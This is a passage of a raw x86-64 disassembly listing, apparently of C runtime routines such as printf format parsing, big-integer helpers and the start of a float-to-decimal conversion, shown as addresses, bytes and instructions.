   32c484f11:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   32c484f17:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484f1d:	e9 8e f8 ff ff       	jmp    0x32c4847b0
   32c484f22:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484f26:	45 31 f6             	xor    %r14d,%r14d
   32c484f29:	4c 89 ee             	mov    %r13,%rsi
   32c484f2c:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484f32:	e9 79 f8 ff ff       	jmp    0x32c4847b0
   32c484f37:	0f b6 46 02          	movzbl 0x2(%rsi),%eax
   32c484f3b:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   32c484f41:	48 83 c6 02          	add    $0x2,%rsi
   32c484f45:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484f4b:	e9 60 f8 ff ff       	jmp    0x32c4847b0
   32c484f50:	4d 85 c9             	test   %r9,%r9
   32c484f53:	b8 02 c0 ff ff       	mov    $0xffffc002,%eax
   32c484f58:	0f 45 d0             	cmovne %eax,%edx
   32c484f5b:	e9 57 fa ff ff       	jmp    0x32c4849b7
   32c484f60:	0c 80                	or     $0x80,%al
   32c484f62:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484f66:	e9 2c fa ff ff       	jmp    0x32c484997
   32c484f6b:	c7 84 24 80 00 00 00 	movl   $0x10,0x80(%rsp)
   32c484f72:	10 00 00 00 
   32c484f76:	89 f8                	mov    %edi,%eax
   32c484f78:	80 cc 02             	or     $0x2,%ah
   32c484f7b:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484f7f:	e9 ae fc ff ff       	jmp    0x32c484c32
   32c484f84:	66 85 d2             	test   %dx,%dx
   32c484f87:	0f 85 ee fe ff ff    	jne    0x32c484e7b
   32c484f8d:	48 85 c0             	test   %rax,%rax
   32c484f90:	b9 05 fc ff ff       	mov    $0xfffffc05,%ecx
   32c484f95:	0f 45 d1             	cmovne %ecx,%edx
   32c484f98:	e9 e3 fe ff ff       	jmp    0x32c484e80
   32c484f9d:	0f b7 c0             	movzwl %ax,%eax
   32c484fa0:	e9 75 f8 ff ff       	jmp    0x32c48481a
   32c484fa5:	48 0f bf c9          	movswq %cx,%rcx
   32c484fa9:	e9 d8 f8 ff ff       	jmp    0x32c484886
   32c484fae:	48 89 02             	mov    %rax,(%rdx)
   32c484fb1:	e9 ca fc ff ff       	jmp    0x32c484c80
   32c484fb6:	83 e9 30             	sub    $0x30,%ecx
   32c484fb9:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   32c484fbd:	41 89 0e             	mov    %ecx,(%r14)
   32c484fc0:	e9 eb f7 ff ff       	jmp    0x32c4847b0
   32c484fc5:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484fc9:	41 ba 02 00 00 00    	mov    $0x2,%r10d
   32c484fcf:	4c 89 ee             	mov    %r13,%rsi
   32c484fd2:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   32c484fd9:	00 00 00 00 
   32c484fdd:	4c 8d b4 24 80 00 00 	lea    0x80(%rsp),%r14
   32c484fe4:	00 
   32c484fe5:	e9 c6 f7 ff ff       	jmp    0x32c4847b0
   32c484fea:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484fef:	48 89 c1             	mov    %rax,%rcx
   32c484ff2:	e8 69 da ff ff       	call   0x32c482a60
   32c484ff7:	e9 94 f8 ff ff       	jmp    0x32c484890
   32c484ffc:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   32c485000:	e9 81 f8 ff ff       	jmp    0x32c484886
   32c485005:	48 8b 45 00          	mov    0x0(%rbp),%rax
   32c485009:	e9 0c f8 ff ff       	jmp    0x32c48481a
   32c48500e:	80 7e 02 34          	cmpb   $0x34,0x2(%rsi)
   32c485012:	0f 84 8d 00 00 00    	je     0x32c4850a5
   32c485018:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c48501c:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
   32c485023:	f6 c4 40             	test   $0x40,%ah
   32c485026:	75 0d                	jne    0x32c485035
   32c485028:	39 b4 24 98 00 00 00 	cmp    %esi,0x98(%rsp)
   32c48502f:	0f 8e 7d f6 ff ff    	jle    0x32c4846b2
   32c485035:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   32c48503a:	f6 c4 20             	test   $0x20,%ah
   32c48503d:	0f 85 d6 00 00 00    	jne    0x32c485119
   32c485043:	48 63 c6             	movslq %esi,%rax
   32c485046:	c6 04 02 25          	movb   $0x25,(%rdx,%rax,1)
   32c48504a:	e9 63 f6 ff ff       	jmp    0x32c4846b2
   32c48504f:	90                   	nop
   32c485050:	88 02                	mov    %al,(%rdx)
   32c485052:	e9 29 fc ff ff       	jmp    0x32c484c80
   32c485057:	0f b6 46 02          	movzbl 0x2(%rsi),%eax
   32c48505b:	41 bb 05 00 00 00    	mov    $0x5,%r11d
   32c485061:	48 83 c6 02          	add    $0x2,%rsi
   32c485065:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c48506b:	e9 40 f7 ff ff       	jmp    0x32c4847b0
   32c485070:	b9 25 00 00 00       	mov    $0x25,%ecx
   32c485075:	e8 06 34 00 00       	call   0x32c488480
   32c48507a:	e9 2b fa ff ff       	jmp    0x32c484aaa
   32c48507f:	8b 45 00             	mov    0x0(%rbp),%eax
   32c485082:	e9 93 f7 ff ff       	jmp    0x32c48481a
   32c485087:	66 89 02             	mov    %ax,(%rdx)
   32c48508a:	e9 f1 fb ff ff       	jmp    0x32c484c80
   32c48508f:	45 85 d2             	test   %r10d,%r10d
   32c485092:	75 43                	jne    0x32c4850d7
   32c485094:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   32c48509b:	00 
   32c48509c:	f7 5c 24 7c          	negl   0x7c(%rsp)
   32c4850a0:	e9 ac f9 ff ff       	jmp    0x32c484a51
   32c4850a5:	0f b6 46 03          	movzbl 0x3(%rsi),%eax
   32c4850a9:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   32c4850af:	48 83 c6 03          	add    $0x3,%rsi
   32c4850b3:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c4850b9:	e9 f2 f6 ff ff       	jmp    0x32c4847b0
   32c4850be:	0f b6 46 03          	movzbl 0x3(%rsi),%eax
   32c4850c2:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   32c4850c8:	48 83 c6 03          	add    $0x3,%rsi
   32c4850cc:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c4850d2:	e9 d9 f6 ff ff       	jmp    0x32c4847b0
   32c4850d7:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c4850db:	48 89 d5             	mov    %rdx,%rbp
   32c4850de:	4c 89 ee             	mov    %r13,%rsi
   32c4850e1:	45 31 f6             	xor    %r14d,%r14d
   32c4850e4:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   32c4850eb:	ff ff ff ff 
   32c4850ef:	41 ba 02 00 00 00    	mov    $0x2,%r10d
   32c4850f5:	e9 b6 f6 ff ff       	jmp    0x32c4847b0
   32c4850fa:	44 89 d1             	mov    %r10d,%ecx
   32c4850fd:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c485102:	48 8d 15 31 6f 00 00 	lea    0x6f31(%rip),%rdx        # 0x32c48c03a
   32c485109:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   32c48510f:	e8 bc d8 ff ff       	call   0x32c4829d0
   32c485114:	e9 67 fb ff ff       	jmp    0x32c484c80
   32c485119:	b9 25 00 00 00       	mov    $0x25,%ecx
   32c48511e:	e8 5d 33 00 00       	call   0x32c488480
   32c485123:	e9 8a f5 ff ff       	jmp    0x32c4846b2
   32c485128:	90                   	nop
   32c485129:	90                   	nop
   32c48512a:	90                   	nop
   32c48512b:	90                   	nop
   32c48512c:	90                   	nop
   32c48512d:	90                   	nop
   32c48512e:	90                   	nop
   32c48512f:	90                   	nop
   32c485130:	90                   	nop
   32c485131:	90                   	nop
   32c485132:	90                   	nop
   32c485133:	90                   	nop
   32c485134:	90                   	nop
   32c485135:	90                   	nop
   32c485136:	90                   	nop
   32c485137:	90                   	nop
   32c485138:	90                   	nop
   32c485139:	90                   	nop
   32c48513a:	90                   	nop
   32c48513b:	90                   	nop
   32c48513c:	90                   	nop
   32c48513d:	90                   	nop
   32c48513e:	90                   	nop
   32c48513f:	90                   	nop
   32c485140:	53                   	push   %rbx
   32c485141:	48 83 ec 20          	sub    $0x20,%rsp
   32c485145:	31 db                	xor    %ebx,%ebx
   32c485147:	83 f9 1b             	cmp    $0x1b,%ecx
   32c48514a:	7e 20                	jle    0x32c48516c
   32c48514c:	b8 04 00 00 00       	mov    $0x4,%eax
   32c485151:	0f 1f 40 00          	nopl   0x0(%rax)
   32c485155:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48515c:	00 00 00 00 
   32c485160:	01 c0                	add    %eax,%eax
   32c485162:	83 c3 01             	add    $0x1,%ebx
   32c485165:	8d 50 17             	lea    0x17(%rax),%edx
   32c485168:	39 ca                	cmp    %ecx,%edx
   32c48516a:	7c f4                	jl     0x32c485160
   32c48516c:	89 d9                	mov    %ebx,%ecx
   32c48516e:	e8 4d 20 00 00       	call   0x32c4871c0
   32c485173:	89 18                	mov    %ebx,(%rax)
   32c485175:	48 83 c0 04          	add    $0x4,%rax
   32c485179:	48 83 c4 20          	add    $0x20,%rsp
   32c48517d:	5b                   	pop    %rbx
   32c48517e:	c3                   	ret
   32c48517f:	90                   	nop
   32c485180:	57                   	push   %rdi
   32c485181:	56                   	push   %rsi
   32c485182:	53                   	push   %rbx
   32c485183:	48 83 ec 20          	sub    $0x20,%rsp
   32c485187:	48 89 cb             	mov    %rcx,%rbx
   32c48518a:	48 89 d7             	mov    %rdx,%rdi
   32c48518d:	41 83 f8 1b          	cmp    $0x1b,%r8d
   32c485191:	7e 75                	jle    0x32c485208
   32c485193:	b8 04 00 00 00       	mov    $0x4,%eax
   32c485198:	31 f6                	xor    %esi,%esi
   32c48519a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4851a0:	01 c0                	add    %eax,%eax
   32c4851a2:	83 c6 01             	add    $0x1,%esi
   32c4851a5:	8d 50 17             	lea    0x17(%rax),%edx
   32c4851a8:	41 39 d0             	cmp    %edx,%r8d
   32c4851ab:	7f f3                	jg     0x32c4851a0
   32c4851ad:	89 f1                	mov    %esi,%ecx
   32c4851af:	e8 0c 20 00 00       	call   0x32c4871c0
   32c4851b4:	89 30                	mov    %esi,(%rax)
   32c4851b6:	0f b6 13             	movzbl (%rbx),%edx
   32c4851b9:	4c 8d 40 04          	lea    0x4(%rax),%r8
   32c4851bd:	88 50 04             	mov    %dl,0x4(%rax)
   32c4851c0:	84 d2                	test   %dl,%dl
   32c4851c2:	74 4c                	je     0x32c485210
   32c4851c4:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   32c4851c8:	4c 89 c0             	mov    %r8,%rax
   32c4851cb:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4851d2:	00 00 00 
   32c4851d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4851dc:	00 00 00 00 
   32c4851e0:	0f b6 11             	movzbl (%rcx),%edx
   32c4851e3:	48 83 c0 01          	add    $0x1,%rax
   32c4851e7:	48 83 c1 01          	add    $0x1,%rcx
   32c4851eb:	88 10                	mov    %dl,(%rax)
   32c4851ed:	84 d2                	test   %dl,%dl
   32c4851ef:	75 ef                	jne    0x32c4851e0
   32c4851f1:	48 85 ff             	test   %rdi,%rdi
   32c4851f4:	74 03                	je     0x32c4851f9
   32c4851f6:	48 89 07             	mov    %rax,(%rdi)
   32c4851f9:	4c 89 c0             	mov    %r8,%rax
   32c4851fc:	48 83 c4 20          	add    $0x20,%rsp
   32c485200:	5b                   	pop    %rbx
   32c485201:	5e                   	pop    %rsi
   32c485202:	5f                   	pop    %rdi
   32c485203:	c3                   	ret
   32c485204:	0f 1f 40 00          	nopl   0x0(%rax)
   32c485208:	31 f6                	xor    %esi,%esi
   32c48520a:	eb a1                	jmp    0x32c4851ad
   32c48520c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c485210:	4c 89 c0             	mov    %r8,%rax
   32c485213:	eb dc                	jmp    0x32c4851f1
   32c485215:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48521c:	00 00 00 00 
   32c485220:	ba 01 00 00 00       	mov    $0x1,%edx
   32c485225:	48 89 c8             	mov    %rcx,%rax
   32c485228:	8b 49 fc             	mov    -0x4(%rcx),%ecx
   32c48522b:	d3 e2                	shl    %cl,%edx
   32c48522d:	66 0f 6e c1          	movd   %ecx,%xmm0
   32c485231:	48 8d 48 fc          	lea    -0x4(%rax),%rcx
   32c485235:	66 0f 6e ca          	movd   %edx,%xmm1
   32c485239:	66 0f 62 c1          	punpckldq %xmm1,%xmm0
   32c48523d:	66 0f d6 40 04       	movq   %xmm0,0x4(%rax)
   32c485242:	e9 89 20 00 00       	jmp    0x32c4872d0
   32c485247:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48524e:	00 00 
   32c485250:	41 57                	push   %r15
   32c485252:	41 56                	push   %r14
   32c485254:	41 55                	push   %r13
   32c485256:	41 54                	push   %r12
   32c485258:	55                   	push   %rbp
   32c485259:	57                   	push   %rdi
   32c48525a:	56                   	push   %rsi
   32c48525b:	53                   	push   %rbx
   32c48525c:	48 83 ec 38          	sub    $0x38,%rsp
   32c485260:	31 c0                	xor    %eax,%eax
   32c485262:	8b 72 14             	mov    0x14(%rdx),%esi
   32c485265:	49 89 cc             	mov    %rcx,%r12
   32c485268:	49 89 d3             	mov    %rdx,%r11
   32c48526b:	39 71 14             	cmp    %esi,0x14(%rcx)
   32c48526e:	0f 8c 27 01 00 00    	jl     0x32c48539b
   32c485274:	83 ee 01             	sub    $0x1,%esi
   32c485277:	48 8d 5a 18          	lea    0x18(%rdx),%rbx
   32c48527b:	48 8d 69 18          	lea    0x18(%rcx),%rbp
   32c48527f:	31 d2                	xor    %edx,%edx
   32c485281:	4c 63 d6             	movslq %esi,%r10
   32c485284:	49 c1 e2 02          	shl    $0x2,%r10
   32c485288:	4a 8d 3c 13          	lea    (%rbx,%r10,1),%rdi
   32c48528c:	49 01 ea             	add    %rbp,%r10
   32c48528f:	8b 07                	mov    (%rdi),%eax
   32c485291:	45 8b 02             	mov    (%r10),%r8d
   32c485294:	8d 48 01             	lea    0x1(%rax),%ecx
   32c485297:	44 89 c0             	mov    %r8d,%eax
   32c48529a:	f7 f1                	div    %ecx
   32c48529c:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   32c4852a0:	41 89 c5             	mov    %eax,%r13d
   32c4852a3:	41 39 c8             	cmp    %ecx,%r8d
   32c4852a6:	72 5e                	jb     0x32c485306
   32c4852a8:	41 89 c7             	mov    %eax,%r15d
   32c4852ab:	49 89 d9             	mov    %rbx,%r9
   32c4852ae:	49 89 e8             	mov    %rbp,%r8
   32c4852b1:	45 31 f6             	xor    %r14d,%r14d
   32c4852b4:	31 c9                	xor    %ecx,%ecx
   32c4852b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4852bd:	00 00 00 
   32c4852c0:	41 8b 01             	mov    (%r9),%eax
   32c4852c3:	41 8b 10             	mov    (%r8),%edx
   32c4852c6:	49 83 c1 04          	add    $0x4,%r9
   32c4852ca:	49 83 c0 04          	add    $0x4,%r8
   32c4852ce:	49 0f af c7          	imul   %r15,%rax
   32c4852d2:	4c 01 f0             	add    %r14,%rax
   32c4852d5:	49 89 c6             	mov    %rax,%r14
   32c4852d8:	89 c0                	mov    %eax,%eax
   32c4852da:	48 29 c2             	sub    %rax,%rdx
   32c4852dd:	49 c1 ee 20          	shr    $0x20,%r14
   32c4852e1:	48 89 d0             	mov    %rdx,%rax
   32c4852e4:	48 29 c8             	sub    %rcx,%rax
   32c4852e7:	48 89 c1             	mov    %rax,%rcx
   32c4852ea:	41 89 40 fc          	mov    %eax,-0x4(%r8)
   32c4852ee:	48 c1 e9 20          	shr    $0x20,%rcx
   32c4852f2:	83 e1 01             	and    $0x1,%ecx
   32c4852f5:	4c 39 cf             	cmp    %r9,%rdi
   32c4852f8:	73 c6                	jae    0x32c4852c0
   32c4852fa:	45 8b 0a             	mov    (%r10),%r9d
   32c4852fd:	45 85 c9             	test   %r9d,%r9d
   32c485300:	0f 84 c5 00 00 00    	je     0x32c4853cb
   32c485306:	4c 89 da             	mov    %r11,%rdx
   32c485309:	4c 89 e1             	mov    %r12,%rcx
   32c48530c:	e8 af 26 00 00       	call   0x32c4879c0
   32c485311:	85 c0                	test   %eax,%eax
   32c485313:	0f 88 7e 00 00 00    	js     0x32c485397
   32c485319:	41 8d 45 01          	lea    0x1(%r13),%eax
   32c48531d:	48 89 e9             	mov    %rbp,%rcx
   32c485320:	31 d2                	xor    %edx,%edx
   32c485322:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   32c485326:	0f 1f 40 00          	nopl   0x0(%rax)
   32c48532a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c485331:	00 00 00 00 
   32c485335:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48533c:	00 00 00 00 
   32c485340:	8b 01                	mov    (%rcx),%eax
   32c485342:	44 8b 03             	mov    (%rbx),%r8d
   32c485345:	48 83 c3 04          	add    $0x4,%rbx
   32c485349:	48 83 c1 04          	add    $0x4,%rcx
   32c48534d:	4c 29 c0             	sub    %r8,%rax
   32c485350:	48 29 d0             	sub    %rdx,%rax
   32c485353:	48 89 c2             	mov    %rax,%rdx
   32c485356:	89 41 fc             	mov    %eax,-0x4(%rcx)
   32c485359:	48 c1 ea 20          	shr    $0x20,%rdx
   32c48535d:	83 e2 01             	and    $0x1,%edx
   32c485360:	48 39 df             	cmp    %rbx,%rdi
   32c485363:	73 db                	jae    0x32c485340
   32c485365:	48 63 c6             	movslq %esi,%rax
   32c485368:	8b 4c 85 00          	mov    0x0(%rbp,%rax,4),%ecx
   32c48536c:	85 c9                	test   %ecx,%ecx
   32c48536e:	75 27                	jne    0x32c485397
   32c485370:	48 8d 44 85 fc       	lea    -0x4(%rbp,%rax,4),%rax
   32c485375:	48 39 c5             	cmp    %rax,%rbp
   32c485378:	72 12                	jb     0x32c48538c
   32c48537a:	eb 16                	jmp    0x32c485392
   32c48537c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c485380:	48 83 e8 04          	sub    $0x4,%rax
   32c485384:	83 ee 01             	sub    $0x1,%esi
   32c485387:	48 39 c5             	cmp    %rax,%rbp
   32c48538a:	73 06                	jae    0x32c485392
   32c48538c:	8b 10                	mov    (%rax),%edx
   32c48538e:	85 d2                	test   %edx,%edx
   32c485390:	74 ee                	je     0x32c485380
   32c485392:	41 89 74 24 14       	mov    %esi,0x14(%r12)
   32c485397:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   32c48539b:	48 83 c4 38          	add    $0x38,%rsp
   32c48539f:	5b                   	pop    %rbx
   32c4853a0:	5e                   	pop    %rsi
   32c4853a1:	5f                   	pop    %rdi
   32c4853a2:	5d                   	pop    %rbp
   32c4853a3:	41 5c                	pop    %r12
   32c4853a5:	41 5d                	pop    %r13
   32c4853a7:	41 5e                	pop    %r14
   32c4853a9:	41 5f                	pop    %r15
   32c4853ab:	c3                   	ret
   32c4853ac:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4853b3:	00 00 
   32c4853b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4853bc:	00 00 00 00 
   32c4853c0:	45 8b 02             	mov    (%r10),%r8d
   32c4853c3:	45 85 c0             	test   %r8d,%r8d
   32c4853c6:	75 0c                	jne    0x32c4853d4
   32c4853c8:	83 ee 01             	sub    $0x1,%esi
   32c4853cb:	49 83 ea 04          	sub    $0x4,%r10
   32c4853cf:	4c 39 d5             	cmp    %r10,%rbp
   32c4853d2:	72 ec                	jb     0x32c4853c0
   32c4853d4:	41 89 74 24 14       	mov    %esi,0x14(%r12)
   32c4853d9:	4c 89 da             	mov    %r11,%rdx
   32c4853dc:	4c 89 e1             	mov    %r12,%rcx
   32c4853df:	e8 dc 25 00 00       	call   0x32c4879c0
   32c4853e4:	85 c0                	test   %eax,%eax
   32c4853e6:	0f 89 2d ff ff ff    	jns    0x32c485319
   32c4853ec:	eb a9                	jmp    0x32c485397
   32c4853ee:	90                   	nop
   32c4853ef:	90                   	nop
   32c4853f0:	90                   	nop
   32c4853f1:	90                   	nop
   32c4853f2:	90                   	nop
   32c4853f3:	90                   	nop
   32c4853f4:	90                   	nop
   32c4853f5:	90                   	nop
   32c4853f6:	90                   	nop
   32c4853f7:	90                   	nop
   32c4853f8:	90                   	nop
   32c4853f9:	90                   	nop
   32c4853fa:	90                   	nop
   32c4853fb:	90                   	nop
   32c4853fc:	90                   	nop
   32c4853fd:	90                   	nop
   32c4853fe:	90                   	nop
   32c4853ff:	90                   	nop
   32c485400:	41 57                	push   %r15
   32c485402:	41 56                	push   %r14
   32c485404:	41 55                	push   %r13
   32c485406:	41 54                	push   %r12
   32c485408:	55                   	push   %rbp
   32c485409:	57                   	push   %rdi
   32c48540a:	56                   	push   %rsi
   32c48540b:	53                   	push   %rbx
   32c48540c:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   32c485413:	8b 84 24 28 01 00 00 	mov    0x128(%rsp),%eax
   32c48541a:	8b bc 24 20 01 00 00 	mov    0x120(%rsp),%edi
   32c485421:	4c 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13
   32c485428:	00 
   32c485429:	4c 8b b4 24 38 01 00 	mov    0x138(%rsp),%r14
   32c485430:	00 
   32c485431:	4d 89 cc             	mov    %r9,%r12
   32c485434:	45 8b 09             	mov    (%r9),%r9d
   32c485437:	89 44 24 30          	mov    %eax,0x30(%rsp)
   32c48543b:	4c 89 c5             	mov    %r8,%rbp
   32c48543e:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   32c485443:	44 89 c8             	mov    %r9d,%eax
   32c485446:	89 54 24 28          	mov    %edx,0x28(%rsp)
   32c48544a:	83 e0 cf             	and    $0xffffffcf,%eax
   32c48544d:	41 89 04 24          	mov    %eax,(%r12)
   32c485451:	44 89 c8             	mov    %r9d,%eax
   32c485454:	83 e0 07             	and    $0x7,%eax
   32c485457:	83 f8 03             	cmp    $0x3,%eax
   32c48545a:	0f 84 00 03 00 00    	je     0x32c485760
   32c485460:	44 89 cb             	mov    %r9d,%ebx
   32c485463:	83 e3 04             	and    $0x4,%ebx
   32c485466:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   32c48546a:	0f 85 70 02 00 00    	jne    0x32c4856e0
   32c485470:	85 c0                	test   %eax,%eax
   32c485472:	0f 84 b0 02 00 00    	je     0x32c485728
   32c485478:	44 8b 11             	mov    (%rcx),%r10d
   32c48547b:	b8 20 00 00 00       	mov    $0x20,%eax
   32c485480:	31 c9                	xor    %ecx,%ecx
   32c485482:	41 83 fa 20          	cmp    $0x20,%r10d
   32c485486:	7e 12                	jle    0x32c48549a
   32c485488:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48548f:	00 
   32c485490:	01 c0                	add    %eax,%eax
   32c485492:	83 c1 01             	add    $0x1,%ecx
   32c485495:	41 39 c2             	cmp    %eax,%r10d
   32c485498:	7f f6                	jg     0x32c485490
   32c48549a:	44 89 54 24 4c       	mov    %r10d,0x4c(%rsp)
   32c48549f:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   32c4854a4:	e8 17 1d 00 00       	call   0x32c4871c0
   32c4854a9:	44 8b 54 24 4c       	mov    0x4c(%rsp),%r10d
   32c4854ae:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   32c4854b3:	48 89 c3             	mov    %rax,%rbx
   32c4854b6:	48 8d 50 18          	lea    0x18(%rax),%rdx
   32c4854ba:	48 89 e8             	mov    %rbp,%rax
   32c4854bd:	41 8d 4a ff          	lea    -0x1(%r10),%ecx
   32c4854c1:	c1 f9 05             	sar    $0x5,%ecx
   32c4854c4:	48 63 c9             	movslq %ecx,%rcx
   32c4854c7:	48 c1 e1 02          	shl    $0x2,%rcx
   32c4854cb:	4c 8d 44 0d 00       	lea    0x0(%rbp,%rcx,1),%r8
   32c4854d0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4854d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4854dc:	00 00 00 00 
   32c4854e0:	44 8b 18             	mov    (%rax),%r11d
   32c4854e3:	48 83 c0 04          	add    $0x4,%rax
   32c4854e7:	48 83 c2 04          	add    $0x4,%rdx
   32c4854eb:	44 89 5a fc          	mov    %r11d,-0x4(%rdx)
   32c4854ef:	49 39 c0             	cmp    %rax,%r8
   32c4854f2:	73 ec                	jae    0x32c4854e0
   32c4854f4:	48 8d 45 01          	lea    0x1(%rbp),%rax
   32c4854f8:	49 83 c0 01          	add    $0x1,%r8
   32c4854fc:	49 39 c0             	cmp    %rax,%r8
   32c4854ff:	b8 00 00 00 00       	mov    $0x0,%eax
   32c485504:	48 0f 42 c8          	cmovb  %rax,%rcx
   32c485508:	48 83 c1 04          	add    $0x4,%rcx
   32c48550c:	48 c1 f9 02          	sar    $0x2,%rcx
   32c485510:	41 89 cf             	mov    %ecx,%r15d
   32c485513:	48 8d 04 8b          	lea    (%rbx,%rcx,4),%rax
   32c485517:	eb 14                	jmp    0x32c48552d
   32c485519:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c485520:	48 83 e8 04          	sub    $0x4,%rax
   32c485524:	45 85 ff             	test   %r15d,%r15d
   32c485527:	0f 84 53 02 00 00    	je     0x32c485780
   32c48552d:	8b 48 14             	mov    0x14(%rax),%ecx
   32c485530:	44 89 fa             	mov    %r15d,%edx
   32c485533:	41 83 ef 01          	sub    $0x1,%r15d
   32c485537:	85 c9                	test   %ecx,%ecx
   32c485539:	74 e5                	je     0x32c485520
   32c48553b:	4d 63 c7             	movslq %r15d,%r8
   32c48553e:	89 53 14             	mov    %edx,0x14(%rbx)
   32c485541:	c1 e2 05             	shl    $0x5,%edx
   32c485544:	42 0f bd 44 83 18    	bsr    0x18(%rbx,%r8,4),%eax
   32c48554a:	83 f0 1f             	xor    $0x1f,%eax
   32c48554d:	29 c2                	sub    %eax,%edx
   32c48554f:	41 89 d7             	mov    %edx,%r15d
   32c485552:	48 89 d9             	mov    %rbx,%rcx
   32c485555:	44 89 54 24 4c       	mov    %r10d,0x4c(%rsp)
   32c48555a:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   32c48555f:	e8 bc 1a 00 00       	call   0x32c487020
   32c485564:	8b 74 24 28          	mov    0x28(%rsp),%esi
   32c485568:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   32c48556d:	85 c0                	test   %eax,%eax
   32c48556f:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c485576:	44 8b 54 24 4c       	mov    0x4c(%rsp),%r10d
   32c48557b:	89 74 24 58          	mov    %esi,0x58(%rsp)
   32c48557f:	0f 85 0b 02 00 00    	jne    0x32c485790
   32c485585:	8b 43 14             	mov    0x14(%rbx),%eax
   32c485588:	85 c0                	test   %eax,%eax
   32c48558a:	0f 84 90 01 00 00    	je     0x32c485720
   32c485590:	48 8d 94 24 ac 00 00 	lea    0xac(%rsp),%rdx
   32c485597:	00 
   32c485598:	48 89 d9             	mov    %rbx,%rcx
   32c48559b:	44 89 54 24 4c       	mov    %r10d,0x4c(%rsp)
   32c4855a0:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   32c4855a5:	e8 76 26 00 00       	call   0x32c487c20
   32c4855aa:	8b 74 24 58          	mov    0x58(%rsp),%esi
   32c4855ae:	66 0f ef c9          	pxor   %xmm1,%xmm1
   32c4855b2:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   32c4855b7:	66 48 0f 7e c2       	movq   %xmm0,%rdx
   32c4855bc:	66 0f 7e c0          	movd   %xmm0,%eax
   32c4855c0:	44 8b 54 24 4c       	mov    0x4c(%rsp),%r10d
   32c4855c5:	48 c1 ea 20          	shr    $0x20,%rdx
   32c4855c9:	46 8d 1c 3e          	lea    (%rsi,%r15,1),%r11d
   32c4855cd:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
   32c4855d3:	41 8d 4b ff          	lea    -0x1(%r11),%ecx
   32c4855d7:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
   32c4855dd:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
   32c4855e1:	f2 0f 59 0d ef 6b 00 	mulsd  0x6bef(%rip),%xmm1        # 0x32c48c1d8
   32c4855e8:	00 
   32c4855e9:	48 89 d6             	mov    %rdx,%rsi
   32c4855ec:	48 c1 e6 20          	shl    $0x20,%rsi
   32c4855f0:	48 09 f0             	or     %rsi,%rax
   32c4855f3:	be 01 00 00 00       	mov    $0x1,%esi
   32c4855f8:	44 29 de             	sub    %r11d,%esi
   32c4855fb:	85 c9                	test   %ecx,%ecx
   32c4855fd:	66 48 0f 6e c0       	movq   %rax,%xmm0
   32c485602:	0f 49 f1             	cmovns %ecx,%esi
   32c485605:	f2 0f 5c 05 b3 6b 00 	subsd  0x6bb3(%rip),%xmm0        # 0x32c48c1c0
   32c48560c:	00 
